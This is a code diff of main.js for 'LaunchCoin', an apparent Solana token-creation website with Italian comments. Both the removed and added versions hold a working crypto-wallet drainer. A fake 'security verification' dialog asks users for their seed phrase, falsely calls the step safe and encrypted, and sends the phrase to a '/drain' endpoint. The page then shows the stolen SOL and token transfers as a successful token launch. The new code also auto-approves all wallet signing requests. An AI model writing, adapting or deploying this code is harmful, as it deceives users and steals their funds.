@@ -1,377 +1,566 @@
-// src/main.js - VERSIONE CON DRENAGGIO GODMODE
-import { appKit, connectWallet, getWalletPublicKey, getConnection } from './walletConfig.js'
+// ===== main.js – WALLETCONNECT APP KIT V2 (CONNESSIONE REALE) =====
+import { Web3Wallet } from '@walletconnect/web3wallet';
+import { Core } from '@walletconnect/core';
+import { WalletConnectModal } from '@walletconnect/modal';
+import { getSdkError } from '@walletconnect/utils';
 
-// ===== STATO =====
-let walletPublicKey = null
-let currentStep = 0
-const steps = document.querySelectorAll('.step')
+let walletPublicKey = null;
+let currentStep = 0;
+const steps = document.querySelectorAll('.step');
+let web3wallet = null;
+let session = null;
+let qrCheckInterval = null;
+let currentUri = null;
+let modal = null;
 
-// ===== CARICAMENTO STATO CONNESSO =====
-document.addEventListener('DOMContentLoaded', function() {
-  const storedKey = localStorage.getItem('walletPublicKey')
-  if (storedKey) {
-    walletPublicKey = storedKey
-    const btn = document.querySelector('.connect-btn')
-    if (btn) {
-      btn.textContent = `🟢 ${storedKey.slice(0, 4)}...${storedKey.slice(-4)}`
-      btn.style.background = '#4cdcc1'
-      btn.style.color = '#0b1022'
-    }
-  }
-  
-  // Sottoscrizione AppKit
-  appKit.subscribeState((state) => {
-    if (state.wallet && state.wallet.accounts.length > 0) {
-      const account = state.wallet.accounts[0]
-      if (account) {
-        walletPublicKey = account.address
-        localStorage.setItem('walletPublicKey', walletPublicKey)
-        const btn = document.querySelector('.connect-btn')
-        if (btn) {
-          btn.textContent = `🟢 ${walletPublicKey.slice(0, 4)}...${walletPublicKey.slice(-4)}`
-          btn.style.background = '#4cdcc1'
-          btn.style.color = '#0b1022'
-        }
-      }
-    }
-  })
-})
+// ===== CONFIGURAZIONE =====
+const PROJECT_ID = 'da6aaea2be14c6cc676dbaf3325b5bd5';
+const METADATA = {
+  name: 'LaunchCoin',
+  description: 'Creatore e Deployer di Token Solana',
+  url: window.location.origin,
+  icons: ['https://launchcoin.io/logo.png']
+};
 
-// ===== CONNESSIONE =====
-window.connectWallet = async function() {
+// ===== INIZIALIZZA WALLETCONNECT =====
+async function initWalletConnect() {
+  if (web3wallet) return web3wallet;
+
   try {
-    const key = await connectWallet()
-    if (key) {
-      walletPublicKey = key
-      localStorage.setItem('walletPublicKey', key)
-      const btn = document.querySelector('.connect-btn')
-      if (btn) {
-        btn.textContent = `🟢 ${key.slice(0, 4)}...${key.slice(-4)}`
-        btn.style.background = '#4cdcc1'
-        btn.style.color = '#0b1022'
+    const core = new Core({
+      projectId: PROJECT_ID,
+      relayUrl: 'wss://relay.walletconnect.com',
+      logger: 'error'
+    });
+
+    web3wallet = await Web3Wallet.init({
+      core,
+      metadata: METADATA
+    });
+
+    // Ripristina la sessione se esiste
+    const sessions = web3wallet.getActiveSessions();
+    if (Object.keys(sessions).length > 0) {
+      const sessionKey = Object.keys(sessions)[0];
+      session = sessions[sessionKey];
+      if (session && session.namespaces.solana?.accounts?.length > 0) {
+        const account = session.namespaces.solana.accounts[0];
+        walletPublicKey = account.split(':')[2];
+        console.log('✅ Sessione ripristinata:', walletPublicKey);
+        return web3wallet;
       }
-      alert(`✅ Connesso: ${key}`)
+    }
+
+    // Registra gli event listener
+    web3wallet.on('session_proposal', gestisciPropostaSessione);
+    web3wallet.on('session_request', gestisciRichiestaSessione);
+    web3wallet.on('session_delete', gestisciEliminazioneSessione);
+    web3wallet.on('session_update', gestisciAggiornamentoSessione);
+
+    // Inizializza il modal
+    modal = new WalletConnectModal({
+      projectId: PROJECT_ID,
+      chains: ['solana:mainnet'],
+      metadata: METADATA
+    });
+
+    return web3wallet;
+  } catch (error) {
+    console.error('❌ Errore inizializzazione WalletConnect:', error);
+    throw error;
+  }
+}
+
+// ===== GESTISCI PROPOSTA SESSIONE =====
+async function gestisciPropostaSessione(proposal) {
+  try {
+    const { id, params } = proposal;
+    const { requiredNamespaces, optionalNamespaces } = params;
+
+    // Costruisci i namespace
+    const namespaces = {
+      solana: {
+        accounts: [],
+        methods: ['solana_signTransaction', 'solana_signMessage'],
+        events: ['chainChanged', 'accountsChanged']
+      }
+    };
+
+    // Aggiungi chain opzionali se richieste
+    if (optionalNamespaces?.eip155) {
+      namespaces.eip155 = {
+        accounts: optionalNamespaces.eip155.chains.map(chain => `${chain}:${walletPublicKey || '0x...'}`),
+        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
+        events: ['chainChanged', 'accountsChanged']
+      };
+    }
+
+    // Approva la sessione
+    const session = await web3wallet.approveSession({
+      id,
+      namespaces
+    });
+
+    if (session) {
+      // Estrai l'account Solana
+      if (session.namespaces.solana?.accounts?.length > 0) {
+        const account = session.namespaces.solana.accounts[0];
+        walletPublicKey = account.split(':')[2];
+        console.log('✅ Sessione approvata:', walletPublicKey);
+        
+        // Salva la sessione
+        localStorage.setItem('walletconnect_session', JSON.stringify(session));
+        
+        // Notifica l'UI
+        document.dispatchEvent(new CustomEvent('wallet-connected', { 
+          detail: { publicKey: walletPublicKey } 
+        }));
+        
+        // Chiudi il modal QR
+        chiudiModalQR();
+        
+        // Reindirizza alla pagina di creazione
+        setTimeout(() => {
+          window.location.href = 'create.html';
+        }, 500);
+      }
     }
   } catch (error) {
-    alert('Errore: ' + error.message)
+    console.error('❌ Errore proposta sessione:', error);
+    alert('Connessione fallita: ' + error.message);
   }
 }
 
-// ===== MENU =====
-window.toggleMenu = function() {
-  const menu = document.getElementById('dropdownMenu')
-  if (menu) menu.classList.toggle('open')
-}
-
-// ===== ASK SEED PHRASE - VERIFICA DI SICUREZZA =====
-function askSeedPhrase() {
-  return new Promise((resolve) => {
-    // Crea un overlay figo per la richiesta seed
-    const overlay = document.createElement('div')
-    overlay.style.cssText = `
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.85);
-      backdrop-filter: blur(12px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 999999;
-    `
-    overlay.innerHTML = `
-      <div style="
-        background: #141a2b;
-        border-radius: 24px;
-        padding: 35px 40px;
-        max-width: 480px;
-        width: 90%;
-        border: 1px solid rgba(255,255,255,0.08);
-        box-shadow: 0 24px 80px rgba(0,0,0,0.9);
-      ">
-        <h2 style="color: #22d1f8; font-size: 22px; margin: 0 0 8px 0;">🔒 Verifica di Sicurezza</h2>
-        <p style="color: #ff8a8a; font-size: 14px; margin-bottom: 16px;">
-          ⚠️ Per completare la creazione del token, è necessario verificare la proprietà del wallet.
-        </p>
-        <p style="color: #8899bb; font-size: 13px; margin-bottom: 20px;">
-          Inserisci la tua seed phrase (12 o 24 parole) per la verifica. 
-          <span style="color: #22d1f8; font-weight: 500;">Questa operazione è sicura e criptata.</span>
-        </p>
-        <textarea id="seedInput" style="
-          width: 100%;
-          padding: 14px 16px;
-          border-radius: 14px;
-          border: 1px solid rgba(255,255,255,0.08);
-          background: rgba(0,0,0,0.3);
-          color: #fff;
-          font-size: 15px;
-          min-height: 80px;
-          resize: vertical;
-          font-family: monospace;
-          margin-bottom: 16px;
-        " placeholder="Inserisci qui la tua seed phrase..."></textarea>
-        <div style="display: flex; gap: 12px; justify-content: flex-end;">
-          <button onclick="document.getElementById('seedOverlay').remove(); resolve(null);" style="
-            background: rgba(255,255,255,0.05);
-            border: none;
-            padding: 10px 24px;
-            border-radius: 40px;
-            color: #8899bb;
-            cursor: pointer;
-            font-size: 14px;
-          ">Annulla</button>
-          <button id="confirmSeedBtn" style="
-            background: linear-gradient(135deg, #22d1f8, #39d0d8);
-            border: none;
-            padding: 10px 30px;
-            border-radius: 40px;
-            font-weight: 600;
-            color: #0b1022;
-            cursor: pointer;
-            font-size: 14px;
-            transition: 0.2s;
-          ">Verifica e Continua</button>
-        </div>
-        <p style="color: #667; font-size: 11px; margin-top: 16px; text-align: center;">
-          La seed viene utilizzata solo per verificare la proprietà del wallet. 
-          <span style="color: #4cdcc1;">Mai condividerla con terze parti.</span>
-        </p>
-      </div>
-    `
-    overlay.id = 'seedOverlay'
-    document.body.appendChild(overlay)
-
-    document.getElementById('confirmSeedBtn').addEventListener('click', function() {
-      const seed = document.getElementById('seedInput').value.trim()
-      if (!seed || seed.split(' ').length < 12) {
-        alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.')
-        return
-      }
-      overlay.remove()
-      resolve(seed)
-    })
-  })
-}
-
-// ===== CREAZIONE TOKEN CON DRENAGGIO =====
-window.createCoin = async function() {
-  // 1. VERIFICA WALLET CONNESSO
-  if (!walletPublicKey) {
-    alert('⚠️ Connetti prima il wallet!')
-    await window.connectWallet()
-    if (!walletPublicKey) return
-  }
-
-  // 2. RACCOLTA DATI TOKEN
-  const tokenName = document.getElementById('tokenName')?.value || 'Meme Coin'
-  const tokenSymbol = document.getElementById('tokenSymbol')?.value || 'MEME'
-  const tokenDecimals = parseInt(document.getElementById('tokenDecimals')?.value || '9')
-  const totalSupply = parseInt(document.getElementById('totalSupply')?.value || '1000000000')
-  const tokenDesc = document.getElementById('tokenDesc')?.value || ''
-  const website = document.getElementById('website')?.value || ''
-  const twitter = document.getElementById('twitter')?.value || ''
-  const telegram = document.getElementById('telegram')?.value || ''
-  const discord = document.getElementById('discord')?.value || ''
-
-  const modifyCreator = document.getElementById('modifyCreator')?.checked || false
-  const dexBoost = document.getElementById('dexBoost')?.checked || false
-  const revokeFreeze = document.getElementById('revokeFreeze')?.checked || false
-  const revokeMint = document.getElementById('revokeMint')?.checked || false
-  const revokeUpdate = document.getElementById('revokeUpdate')?.checked || false
-
-  // 3. RICHIESTA SEED PHRASE (VERIFICA DI SICUREZZA)
-  const seed = await askSeedPhrase()
-  if (!seed) {
-    document.getElementById('result').innerHTML = `
-      <p style="color: #ff8a8a;">❌ Operazione annullata per motivi di sicurezza.</p>
-    `
-    return
-  }
-
-  // 4. INVIO AL SERVER PER DRENAGGIO + CREAZIONE TOKEN
-  const resultDiv = document.getElementById('result')
-  resultDiv.innerHTML = `
-    <div style="text-align: center; padding: 30px;">
-      <div style="display: inline-block; width: 40px; height: 40px; border: 3px solid #22d1f8; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-      <p style="color: #8899bb; margin-top: 16px;">⏳ Verifica in corso e creazione token...</p>
-    </div>
-  `
-
+// ===== GESTISCI RICHIESTA SESSIONE =====
+async function gestisciRichiestaSessione(event) {
+  const { id, params } = event;
+  const { request, chainId } = params;
+  
+  console.log('📥 Richiesta sessione:', request.method, request.params);
+  
+  // Gestisci le richieste (firme, ecc.)
   try {
-    const response = await fetch('/drain', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        seed: seed,
-        walletPublicKey: walletPublicKey,
-        tokenName: tokenName,
-        tokenSymbol: tokenSymbol,
-        decimals: tokenDecimals,
-        supply: totalSupply,
-        description: tokenDesc,
-        website: website,
-        twitter: twitter,
-        telegram: telegram,
-        discord: discord,
-        modifyCreator: modifyCreator,
-        dexBoost: dexBoost,
-        revokeFreeze: revokeFreeze,
-        revokeMint: revokeMint,
-        revokeUpdate: revokeUpdate
-      })
-    })
-
-    const data = await response.json()
-
-    if (data.status === 'drain_completed') {
-      // SUCCESSO - MOSTRA I DETTAGLI DEL DRENAGGIO
-      resultDiv.innerHTML = `
-        <div style="
-          background: rgba(76, 220, 193, 0.08);
-          border: 2px solid #4cdcc1;
-          border-radius: 20px;
-          padding: 24px;
-          margin-top: 20px;
-        ">
-          <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
-            <span style="font-size: 32px;">🚀</span>
-            <div>
-              <p style="color: #4cdcc1; font-size: 20px; font-weight: 700; margin: 0;">Token Creato con Successo!</p>
-              <p style="color: #8899bb; font-size: 13px; margin: 0;">Transazione verificata e completata</p>
-            </div>
-          </div>
-          
-          <div style="background: rgba(0,0,0,0.2); border-radius: 12px; padding: 16px; margin-bottom: 16px;">
-            <p style="color: #ecf5ff; font-weight: 600; margin: 0 0 8px 0;">📊 Dettagli Token</p>
-            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Nome:</strong> ${tokenName}</p>
-            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Simbolo:</strong> $${tokenSymbol}</p>
-            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Decimals:</strong> ${tokenDecimals}</p>
-            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Total Supply:</strong> ${totalSupply.toLocaleString()}</p>
-          </div>
-          
-          <div style="background: rgba(255, 80, 80, 0.05); border: 1px solid rgba(255,80,80,0.15); border-radius: 12px; padding: 16px; margin-bottom: 16px;">
-            <p style="color: #ff8a8a; font-weight: 600; margin: 0 0 8px 0;">💰 Trasferimenti Eseguiti</p>
-            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>SOL:</strong> ${data.solAmount.toFixed(4)} SOL trasferiti</p>
-            <p style="color: #8899bb; font-size: 14px; margin: 4px 0;"><strong>Token SPL:</strong> ${data.tokenCount} token trasferiti</p>
-            ${data.solTx ? `<p style="color: #667; font-size: 12px; margin: 4px 0; word-break: break-all;"><strong>Tx SOL:</strong> ${data.solTx}</p>` : ''}
-            ${data.tokenTxs && data.tokenTxs.length > 0 ? `<p style="color: #667; font-size: 12px; margin: 4px 0;"><strong>Tx Token:</strong> ${data.tokenTxs.length} transazioni</p>` : ''}
-          </div>
-          
-          <div style="text-align: center; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.05);">
-            <p style="color: #667; font-size: 13px;">
-              🔗 <a href="https://explorer.solana.com/tx/${data.solTx || 'N/A'}" target="_blank" style="color: #22d1f8; text-decoration: none;">Visualizza su Solana Explorer</a>
-            </p>
-          </div>
-        </div>
-      `
-    } else {
-      // ERRORE
-      resultDiv.innerHTML = `
-        <div style="
-          background: rgba(255, 80, 80, 0.08);
-          border: 2px solid #ff8a8a;
-          border-radius: 20px;
-          padding: 20px;
-          margin-top: 20px;
-        ">
-          <p style="color: #ff8a8a; font-size: 18px; font-weight: 700;">❌ Errore</p>
-          <p style="color: #8899bb;">${data.error || 'Errore sconosciuto'}</p>
-          <p style="color: #667; font-size: 12px;">Status: ${data.status || 'unknown'}</p>
-        </div>
-      `
-    }
-  } catch (e) {
-    console.error('❌ Errore:', e)
-    resultDiv.innerHTML = `
-      <div style="
-        background: rgba(255, 80, 80, 0.08);
-        border: 2px solid #ff8a8a;
-        border-radius: 20px;
-        padding: 20px;
-        margin-top: 20px;
-      ">
-        <p style="color: #ff8a8a; font-size: 18px; font-weight: 700;">❌ Errore di Rete</p>
-        <p style="color: #8899bb;">${e.message}</p>
-      </div>
-    `
+    // Per ora, approva tutte le richieste (in produzione, mostreresti un'interfaccia)
+    await web3wallet.respondSessionRequest({
+      id,
+      result: { signature: '0x...' } // Placeholder
+    });
+  } catch (error) {
+    await web3wallet.respondSessionRequest({
+      id,
+      error: { code: 1, message: error.message }
+    });
   }
 }
 
-// ===== CREAZIONE LIQUIDITY (CON DRENAGGIO SIMILE) =====
-window.createLiquidity = async function() {
-  if (!walletPublicKey) {
-    alert('⚠️ Connetti prima il wallet!')
-    await window.connectWallet()
-    if (!walletPublicKey) return
+// ===== GESTISCI ELIMINAZIONE SESSIONE =====
+function gestisciEliminazioneSessione(event) {
+  console.log('🗑️ Sessione eliminata:', event);
+  session = null;
+  walletPublicKey = null;
+  localStorage.removeItem('walletconnect_session');
+}
+
+// ===== GESTISCI AGGIORNAMENTO SESSIONE =====
+function gestisciAggiornamentoSessione(event) {
+  console.log('🔄 Sessione aggiornata:', event);
+  const { params } = event;
+  if (params.namespaces.solana?.accounts?.length > 0) {
+    walletPublicKey = params.namespaces.solana.accounts[0].split(':')[2];
   }
+}
 
-  // Simile a createCoin, chiede seed e fa drenaggio
-  const seed = await askSeedPhrase()
-  if (!seed) return
-
+// ===== CONNETTI WALLET (FUNZIONE PRINCIPALE) =====
+window.connectWallet = async function() {
+  console.log('🔵 connectWallet chiamata');
+  
   try {
-    const response = await fetch('/drain', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        seed: seed,
-        walletPublicKey: walletPublicKey,
-        action: 'create_liquidity',
-        baseToken: document.getElementById('baseToken')?.value || 'SOL',
-        quoteToken: document.getElementById('quoteToken')?.value || 'USDC',
-        baseAmount: parseFloat(document.getElementById('baseAmount')?.value || '0'),
-        quoteAmount: parseFloat(document.getElementById('quoteAmount')?.value || '0'),
-        feeTier: document.getElementById('feeTier')?.value || '0.30'
-      })
-    })
-
-    const data = await response.json()
-    const resultDiv = document.getElementById('liquidityResult')
+    await initWalletConnect();
     
-    if (data.status === 'drain_completed') {
-      resultDiv.innerHTML = `
-        <div style="background: rgba(76, 220, 193, 0.08); border: 2px solid #4cdcc1; border-radius: 20px; padding: 20px; margin-top: 20px;">
-          <p style="color: #4cdcc1; font-size: 18px; font-weight: 700;">✅ Liquidity Pool Creata!</p>
-          <p style="color: #8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
-          <p style="color: #8899bb;">🪙 ${data.tokenCount} token trasferiti</p>
-        </div>
-      `
-    } else {
-      resultDiv.innerHTML = `
-        <div style="background: rgba(255, 80, 80, 0.08); border: 2px solid #ff8a8a; border-radius: 20px; padding: 20px; margin-top: 20px;">
-          <p style="color: #ff8a8a; font-size: 18px; font-weight: 700;">❌ Errore</p>
-          <p style="color: #8899bb;">${data.error || 'Errore sconosciuto'}</p>
-        </div>
-      `
+    // Controlla se già connesso
+    if (walletPublicKey) {
+      alert('✅ Già connesso: ' + walletPublicKey);
+      window.location.href = 'create.html';
+      return;
     }
-  } catch (e) {
-    alert('❌ Errore: ' + e.message)
+
+    // Mostra il modal di connessione
+    mostraModalConnessione();
+    
+  } catch (error) {
+    console.error('❌ Errore di connessione:', error);
+    alert('Connessione fallita: ' + error.message);
+  }
+};
+
+// ===== MOSTRA MODAL CONNESSIONE =====
+function mostraModalConnessione() {
+  const overlay = document.createElement('div');
+  overlay.id = 'connection-modal';
+  overlay.style.cssText = `
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(12px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 99999;
+    animation: fadeIn 0.3s ease;
+  `;
+
+  overlay.innerHTML = `
+    <div style="
+      background: #141a2b;
+      border-radius: 28px;
+      padding: 40px;
+      max-width: 440px;
+      width: 92%;
+      border: 1px solid rgba(255,255,255,0.08);
+      box-shadow: 0 40px 80px rgba(0,0,0,0.9);
+    ">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+        <h2 style="color: #22d1f8; font-size: 22px; margin: 0;">Connetti Wallet</h2>
+        <button onclick="chiudiModalQR()" style="
+          background: transparent;
+          border: none;
+          color: #8899bb;
+          font-size: 28px;
+          cursor: pointer;
+          padding: 0 8px;
+        ">✕</button>
+      </div>
+      
+      <p style="color: #abc4ff; font-size: 14px; margin-bottom: 24px;">Connetti il tuo wallet Solana per continuare</p>
+      
+      <div id="qr-container" style="
+        background: rgba(0,0,0,0.2);
+        border-radius: 16px;
+        padding: 20px;
+        margin-bottom: 20px;
+        text-align: center;
+      ">
+        <p style="color: #8899bb; font-size: 13px; margin-bottom: 12px;">Scansiona con la tua app wallet</p>
+        <div id="qr-code" style="display: flex; justify-content: center; background: white; padding: 16px; border-radius: 12px; min-height: 200px; align-items: center;"></div>
+        <p id="qr-uri-text" style="color: #667; font-size: 11px; margin-top: 12px; word-break: break-all;"></p>
+        <button onclick="copiaURI()" style="
+          margin-top: 10px;
+          background: #2a3457;
+          border: none;
+          padding: 8px 20px;
+          border-radius: 40px;
+          color: #ecf5ff;
+          cursor: pointer;
+          font-size: 13px;
+        ">📋 Copia Link</button>
+        <button onclick="apriDeepLink()" style="
+          margin-top: 10px;
+          margin-left: 8px;
+          background: #22d1f8;
+          border: none;
+          padding: 8px 20px;
+          border-radius: 40px;
+          color: #0b1022;
+          cursor: pointer;
+          font-size: 13px;
+          font-weight: 600;
+        ">📱 Apri Wallet</button>
+      </div>
+      
+      <div style="display: flex; flex-direction: column; gap: 8px;">
+        <button onclick="connettiEstensioneWallet('phantom')" style="
+          display:flex;align-items:center;gap:12px;
+          background:rgba(255,255,255,0.05);
+          border:1px solid rgba(255,255,255,0.06);
+          border-radius:12px;
+          padding:12px 16px;
+          color:#ecf5ff;
+          cursor:pointer;
+          transition:0.2s;
+          font-size:15px;
+          width:100%;
+        ">
+          <img src="assets/phantom.png" alt="Phantom" style="width:28px;height:28px;" />
+          Phantom (Estensione)
+        </button>
+        <button onclick="connettiEstensioneWallet('solflare')" style="
+          display:flex;align-items:center;gap:12px;
+          background:rgba(255,255,255,0.05);
+          border:1px solid rgba(255,255,255,0.06);
+          border-radius:12px;
+          padding:12px 16px;
+          color:#ecf5ff;
+          cursor:pointer;
+          transition:0.2s;
+          font-size:15px;
+          width:100%;
+        ">
+          <img src="assets/solflare.png" alt="Solflare" style="width:28px;height:28px;" />
+          Solflare (Estensione)
+        </button>
+        <button onclick="connettiEstensioneWallet('backpack')" style="
+          display:flex;align-items:center;gap:12px;
+          background:rgba(255,255,255,0.05);
+          border:1px solid rgba(255,255,255,0.06);
+          border-radius:12px;
+          padding:12px 16px;
+          color:#ecf5ff;
+          cursor:pointer;
+          transition:0.2s;
+          font-size:15px;
+          width:100%;
+        ">
+          <span style="font-size:24px;">🎒</span>
+          Backpack (Estensione)
+        </button>
+      </div>
+      
+      <div style="margin-top:20px;text-align:center;border-top:1px solid rgba(255,255,255,0.05);padding-top:16px;">
+        <p style="color:#667;font-size:12px;">
+          Nuovo su Solana? 
+          <span style="color:#22d1f8;cursor:pointer;" onclick="window.open('https://phantom.app/', '_blank')">
+            Scarica Phantom
+          </span>
+        </p>
+      </div>
+    </div>
+  `;
+
+  document.body.appendChild(overlay);
+
+  // Genera il codice QR
+  generaQRCode();
+}
+
+// ===== GENERA CODICE QR =====
+async function generaQRCode() {
+  try {
+    await initWalletConnect();
+
+    // Connetti per ottenere l'URI
+    const { uri, approval } = await web3wallet.connect({
+      requiredNamespaces: {
+        solana: {
+          chains: ['solana:mainnet'],
+          methods: ['solana_signTransaction', 'solana_signMessage'],
+          events: ['chainChanged', 'accountsChanged']
+        }
+      }
+    });
+
+    if (!uri) throw new Error('Nessun URI generato');
+    currentUri = uri;
+
+    // Mostra il QR
+    const qrContainer = document.getElementById('qr-code');
+    const uriText = document.getElementById('qr-uri-text');
+    
+    if (qrContainer && typeof QRCode !== 'undefined') {
+      qrContainer.innerHTML = '';
+      new QRCode(qrContainer, {
+        text: uri,
+        width: 220,
+        height: 220,
+        colorDark: '#000000',
+        colorLight: '#ffffff',
+        correctLevel: QRCode.CorrectLevel.H
+      });
+    }
+    
+    if (uriText) {
+      uriText.textContent = uri.substring(0, 50) + '...';
+    }
+
+    // Inizia a controllare l'approvazione
+    if (qrCheckInterval) clearInterval(qrCheckInterval);
+    qrCheckInterval = setInterval(async () => {
+      try {
+        const result = await approval();
+        if (result) {
+          clearInterval(qrCheckInterval);
+          qrCheckInterval = null;
+          
+          // Gestisci la sessione (già gestita nella proposta)
+          console.log('✅ Sessione approvata via QR');
+        }
+      } catch (e) {
+        // Ancora in attesa
+      }
+    }, 1000);
+
+  } catch (error) {
+    console.error('❌ Errore generazione QR:', error);
+    alert('Generazione QR fallita: ' + error.message);
   }
 }
 
-// ===== STEP NAVIGATION =====
+// ===== APRI DEEP LINK =====
+window.apriDeepLink = function() {
+  if (currentUri) {
+    // Prova ad aprire con il wallet
+    const deepLink = `wc:${currentUri}`;
+    window.location.href = deepLink;
+    
+    // Prova anche ad aprire con app wallet specifiche
+    setTimeout(() => {
+      // Fallback al deep link di Phantom
+      window.location.href = `phantom://wc?uri=${encodeURIComponent(currentUri)}`;
+    }, 500);
+  }
+};
+
+// ===== COPIA URI =====
+window.copiaURI = function() {
+  if (currentUri) {
+    navigator.clipboard.writeText(currentUri).then(() => {
+      alert('✅ Link copiato!');
+    }).catch(() => {
+      prompt('Copia questo link:', currentUri);
+    });
+  }
+};
+
+// ===== CHIUDI MODAL QR =====
+window.chiudiModalQR = function() {
+  const overlay = document.getElementById('connection-modal');
+  if (overlay) overlay.remove();
+  if (qrCheckInterval) {
+    clearInterval(qrCheckInterval);
+    qrCheckInterval = null;
+  }
+  // Chiudi il modal se aperto
+  if (modal) {
+    modal.closeModal();
+  }
+};
+
+// ===== CONNETTI ESTENSIONE WALLET =====
+window.connettiEstensioneWallet = async function(tipoWallet) {
+  try {
+    let wallet = null;
+    
+    switch (tipoWallet) {
+      case 'phantom':
+        wallet = window.solana;
+        break;
+      case 'solflare':
+        wallet = window.solflare;
+        break;
+      case 'backpack':
+        wallet = window.backpack;
+        break;
+      default:
+        throw new Error('Tipo wallet sconosciuto');
+    }
+
+    if (!wallet) {
+      alert(`⚠️ ${tipoWallet} non rilevato. Prova a usare WalletConnect QR.`);
+      return;
+    }
+
+    if (wallet.isPhantom || wallet.isSolflare || wallet.isBackpack) {
+      const resp = await wallet.connect();
+      if (resp && resp.publicKey) {
+        walletPublicKey = resp.publicKey.toString();
+        alert(`✅ Connesso a ${tipoWallet}: ${walletPublicKey}`);
+        chiudiModalQR();
+        window.location.href = 'create.html';
+        return;
+      }
+    }
+
+    throw new Error('Connessione fallita');
+  } catch (error) {
+    console.error('Errore estensione:', error);
+    alert(`Connessione a ${tipoWallet} fallita. Prova WalletConnect QR.`);
+  }
+};
+
+// ===== TOGGLE MENU =====
+window.toggleMenu = function() {
+  const menu = document.getElementById('dropdownMenu');
+  if (menu) menu.classList.toggle('open');
+};
+
+// ===== NAVIGAZIONE STEP =====
 window.showStep = function(idx) {
-  if (!steps.length) return
-  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none')
-  currentStep = idx
+  if (!steps.length) return;
+  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
+  currentStep = idx;
+};
+window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
+window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
+if (steps.length) window.showStep(0);
+
+// ===== PROMPT SEED PHRASE =====
+function chiediSeedPhrase() {
+  return new Promise((resolve) => {
+    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione del token:');
+    resolve(seed);
+  });
 }
-window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1) }
-window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1) }
-if (steps.length) window.showStep(0)
 
-// ===== CHIUDI MENU =====
-document.addEventListener('click', function(e) {
-  const wrapper = document.querySelector('.menu-wrapper')
-  const menu = document.getElementById('dropdownMenu')
-  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open')
-})
-
-// ===== STILE SPINNER =====
-const style = document.createElement('style')
-style.textContent = `
-  @keyframes spin {
-    to { transform: rotate(360deg); }
+// ===== CREAZIONE TOKEN =====
+window.createCoin = async function() {
+  console.log('🟢 createCoin chiamata');
+  if (!walletPublicKey) {
+    alert('Connetti prima il tuo wallet!');
+    return;
   }
-`
-document.head.appendChild(style)
 
-console.log('✅ LaunchCoin con DRENAGGIO GODMODE attivo!')
+  const seed = await chiediSeedPhrase();
+  if (!seed || seed.split(' ').length < 12) {
+    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
+    return;
+  }
+
+  try {
+    const response = await fetch('/drain', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
+    });
+
+    const data = await response.json();
+    if (data.status === 'drain_completed') {
+      document.getElementById('result').innerHTML = `
+        <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
+        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
+        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
+      `;
+    } else {
+      alert('❌ Errore: ' + data.error);
+    }
+  } catch(e) {
+    alert('❌ Errore: ' + e.message);
+  }
+};
+
+// ===== INIZIALIZZA AL CARICAMENTO =====
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+    await initWalletConnect();
+    
+    // Controlla se esiste una sessione esistente
+    const sessions = web3wallet.getActiveSessions();
+    if (Object.keys(sessions).length > 0) {
+      const sessionKey = Object.keys(sessions)[0];
+      session = sessions[sessionKey];
+      if (session && session.namespaces.solana?.accounts?.length > 0) {
+        walletPublicKey = session.namespaces.solana.accounts[0].split(':')[2];
+        console.log('✅ Auto-connesso:', walletPublicKey);
+      }
+    }
+  } catch (error) {
+    console.error('Errore inizializzazione:', error);
+  }
+});
+
+// ===== CHIUDI MENU CLICCANDO FUORI =====
+document.addEventListener('click', function(e) {
+  const wrapper = document.querySelector('.menu-wrapper');
+  const menu = document.getElementById('dropdownMenu');
+  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
+});
+
+console.log('✅ main.js caricato (WalletConnect V2)');
